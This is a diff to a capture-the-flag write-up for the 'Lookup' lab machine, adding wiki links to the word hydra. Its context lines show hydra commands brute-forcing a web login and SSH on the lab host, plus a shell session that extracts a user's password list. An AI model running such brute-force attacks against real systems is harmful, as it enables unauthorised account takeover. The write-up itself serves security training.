@@ -45,7 +45,7 @@ Target: http://lookup.thm/
 [11:47:58] 403 -  275B  - /server-status
 ```
 
-Ran hydra to brute-force the login page using the username admin : 
+Ran [[hydra]] to brute-force the login page using the username admin : 
 
 ```bash
 ❯ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt lookup.thm -s 5000 http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password." -I -vV -c 3
@@ -125,7 +125,7 @@ www-data@lookup:/tmp$ /usr/sbin/pwm
 
 We obtain a list of passwords used by the think user.
 
-We can use these to brute-force SSH into said user :
+We can use these to brute-force SSH into said user with [[hydra]] :
 
 ```bash
 ❯ hydra -l think -P ./jose_passwords lookup.thm ssh -t 4
